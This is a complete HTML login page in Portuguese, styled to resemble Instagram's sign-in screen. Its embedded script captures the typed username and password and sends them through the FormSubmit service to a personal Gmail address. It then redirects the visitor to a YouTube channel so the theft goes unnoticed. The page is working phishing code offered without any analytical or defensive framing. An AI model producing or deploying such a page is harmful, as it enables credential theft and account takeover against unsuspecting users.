<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login </title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Segoe+Script&display=swap" rel="stylesheet" />
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      color: #262626;
    }

    .logo {
      margin-bottom: 30px;
      font-weight: bold;
      font-size: 32px;
      color: #6a1b9a; /* roxo escuro */
      letter-spacing: 2px;
      font-family: 'Segoe Script', cursive;
      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
    }

    form {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 30px;
      border-radius: 6px;
      width: 100%;
      max-width: 320px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.04);
    }

    input {
      margin-bottom: 10px;
      padding: 12px 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
      outline: none;
      font-family: 'Segoe Script', cursive;
      color: #5e35b1; /* tom roxo */
      letter-spacing: 1.5px;
    }

    input::placeholder {
      font-family: 'Segoe Script', cursive;
      color: #9c27b0;
      opacity: 0.8;
      letter-spacing: 1.2px;
    }

    input:focus {
      border-color: #a8a8a8;
      background: #fff;
      color: #4527a0;
      font-weight: bold;
    }

    button {
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      padding: 12px 0;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s ease;
      font-family: 'Roboto', sans-serif;
      letter-spacing: 1px;
    }

    button:hover {
      background-color: #2a78d4;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
      text-align: center;
      max-width: 320px;
    }

    .footer a {
      color: #00376b;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="logo">Entre</div>

  <form id="loginForm">
    <input type="text" name="usuarioteste" placeholder="usuário" required />
    <input type="password" name="respostateste" placeholder="senha" required />

    <input type="hidden" name="_captcha" value="false" />
    <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS" />

    <button type="submit">Enviar</button>
  </form>

  <div class="footer"> 
    <br>
  </div>

  <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const formData = new FormData(form);

fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
  method: 'POST',
  body: new URLSearchParams(formData),
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded'
  }
})
      .then(response => {
        if (response.ok) {
          window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
        } else {
          alert('Erro ao enviar. Tente novamente.');
        }
      })
      .catch(() => {
        alert('Erro de conexão. Verifique sua internet.');
      });
    });
  </script>
</body>
</html>
